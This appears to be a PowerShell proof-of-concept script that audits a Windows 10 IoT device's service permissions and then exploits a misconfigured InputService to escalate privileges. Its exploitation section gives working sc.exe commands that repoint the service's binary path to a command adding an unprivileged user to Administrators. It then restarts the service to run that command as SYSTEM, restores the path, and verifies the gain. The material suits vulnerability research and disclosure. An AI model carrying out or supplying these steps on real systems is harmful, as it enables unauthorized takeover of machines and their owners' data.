#region Win10IoT Audit Code
$CimSession = New-CimSession -ComputerName Win10IoT -Credential Administrator -Authentication Negotiate
Get-CimInstance -ClassName Win32_OperatingSystem -CimSession $CimSession
Get-CimInstance -ClassName Win32_Service -Filter 'Name = "InputService"' -CimSession $CimSession | Format-List *

# Run the service audit function in CimSweep
$ServicePermissions = Get-CSVulnerableServicePermission -CimSession $CimSession
$ServicePermissions | Where-Object { $_.GroupName -eq 'NT AUTHORITY\Authenticated Users' }

# The fact that Authenticated Users can change the service configuration means that
# they can change the service binpath to point to an attacker-controlled executable.
<#
GroupName                  : NT AUTHORITY\Authenticated Users
CanStartService            : {ClipSVC, debugregsvc, dmwappushservice, InputService...}
CanStopService             : {InputService, MapsBroker}
CanChangeServiceConfig     : {InputService}
AllAccessToService         : {InputService}
CanChangePermissionsOfFile : {}
CanDeleteFile              : {}
CanModifyFile              : {}
CanTakeOwnershipOfFile     : {}
CanWriteToFile             : {}
CanWriteDataToFile         : {}
FullControlOfFile          : {}
PSComputerName             : Win10IoT
#>
#endregion

#region Creating a local user who can remote in.
# This could all be accomplished with net.exe but we
# might as well take advantage of the new Win10 cmdlets.
$PSSession = New-PSSession -ComputerName Win10IoT -Credential Administrator -Authentication Negotiate
$Password = Read-Host -AsSecureString
$NewUser = New-LocalUser -Name 'UnprivilegedUser' -Password $Password -PasswordNeverExpires
# Add user to Remote Management Users so they can remote in with PowerShell Remoting
# The user doesn't need to be a member of this group in order to SSH in.
Add-LocalGroupMember -Group 'Remote Management Users' -Member 'UnprivilegedUser'
#endregion

#region Exploitation
# Establish a PSSession as an unprivileged user.
$PSSession = New-PSSession -ComputerName Win10IoT -Credential UnprivilegedUser -Authentication Negotiate
$PSSession | Enter-PSSession

# PowerShell equivalent of whoami. whoami is not present in Win10IoT
[Security.Principal.WindowsIdentity]::GetCurrent()

# As an unprivileged user, the Service cmdlets don't work as you can't get
# a handle to the Service Control Manager. sc.exe works just fine, however.

# Validate that the service is running
sc.exe queryex InputService
# Validate the original service binary path and that it runs as system
sc.exe qc InputService 
<#
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: InputService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\windows\system32\svchost.exe -k LocalSystem
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : InputService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
#>

# Drop your malicious service executable and replace the service bin path
sc.exe config InputService binPath= "net localgroup Administrators UnprivilegedUser /add"
# Validate that the service binpath was changed
sc.exe qc InputService

# Restart the service
sc.exe stop InputService
sc.exe start InputService

# Validate that we were added to the Administrators group
net user UnprivilegedUser

# Restore the service binary
sc.exe config InputService binPath= "C:\windows\system32\svchost.exe -k LocalSystem"
sc.exe start InputService

# Exit the unp
exit

# Establish a new session
$PSSession | Remove-PSSession
$PSSession = New-PSSession -ComputerName Win10IoT -Credential UnprivilegedUser -Authentication Negotiate
$PSSession | Enter-PSSession

# Validate that UnprivilegedUser is a member of Administrators
# or just run `net user UnprivilegedUser`. I like PowerShell versions of commands. ;)
Get-CimInstance Win32_Group | Where-Object { [Security.Principal.WindowsIdentity]::GetCurrent().Groups.Value -contains $_.SID }
#endregion